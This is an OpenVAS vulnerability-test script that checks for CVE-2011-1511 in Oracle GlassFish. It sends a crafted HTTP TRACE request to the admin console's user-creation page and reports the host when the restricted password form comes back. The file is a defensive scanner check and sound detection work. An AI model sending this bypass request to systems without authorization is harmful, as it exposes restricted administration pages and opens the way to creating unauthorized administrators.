###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_glassfish_admin_console_auth_bypass_vuln.nasl 14117 2019-03-12 14:02:42Z cfischer $
#
# Oracle GlassFish Server Administration Console Authentication Bypass Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802411");
  script_version("$Revision: 14117 $");
  script_cve_id("CVE-2011-1511");
  script_bugtraq_id(47818);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-03-12 15:02:42 +0100 (Tue, 12 Mar 2019) $");
  script_tag(name:"creation_date", value:"2012-01-06 14:03:19 +0530 (Fri, 06 Jan 2012)");

  script_name("Oracle GlassFish Server Administration Console Authentication Bypass Vulnerability");

  script_xref(name:"URL", value:"http://securityreason.com/securityalert/8254");
  script_xref(name:"URL", value:"http://www.us-cert.gov/cas/techalerts/TA11-201A.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108381/NGS00106.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_require_ports("Services/www", 4848);
  script_dependencies("GlassFish_detect.nasl");
  script_mandatory_keys("GlassFish/installed", "GlassFishAdminConsole/port");

  script_tag(name:"impact", value:"Successful exploitation could allow local attackers to access sensitive data
  on the server without being authenticated, by making 'TRACE' requests against the Administration Console.");

  script_tag(name:"affected", value:"Oracle GlassFish version 3.0.1 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an error in Administration Console, when handling HTTP
  requests using the 'TRACE' method. A remote unauthenticated attacker can get access to the content of restricted
  pages in the Administration Console and also an attacker can create a new Glassfish administrator.");

  script_tag(name:"solution", value:"Upgrade to Oracle GlassFish 3.1 or later.");

  script_tag(name:"summary", value:"The host is running Oracle GlassFish Server and is prone to security bypass
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_kb_item("GlassFishAdminConsole/port"))
  exit(0);

host = http_host_name(port:port);

req = string("TRACE /common/security/realms/manageUserNew.jsf" +
             "?name=admin-realm&configName=server-config&bare" +
             "=true HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");

res = http_keepalive_send_recv(port:port, data:req);

if("ConfirmPassword" >< res && "newPasswordProp:NewPassword" >< res
    && "405 TRACE method is not allowed" >!< res){
  security_message(port:port);
  exit(0);
}

exit(99);
